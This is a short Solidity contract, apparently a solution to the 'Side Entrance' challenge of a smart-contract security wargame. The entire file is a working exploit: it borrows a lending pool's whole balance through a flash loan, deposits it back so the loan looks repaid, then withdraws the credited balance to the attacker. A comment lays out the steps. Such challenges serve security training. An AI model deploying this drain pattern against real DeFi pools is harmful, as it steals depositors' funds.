// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

/** EXPLOIT | Call the flash loan for all the balance and before repaying deposit with the lender on your account balance. 
    After the flash loan finishes without errors, withdraw your balance with the lender. All the execution in a single transaction. */
contract SideEntranceAttack {
    SideEntranceLenderPool public pool; 

    constructor (address _pool){
        pool = SideEntranceLenderPool(_pool);
    }

    fallback() external payable {}
    receive() external payable {}

   function attack () external {
        //STEP 1
        pool.flashLoan(address(pool).balance);
        //STEP 3
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        //STEP 2
        pool.deposit{value: msg.value}();
    }
}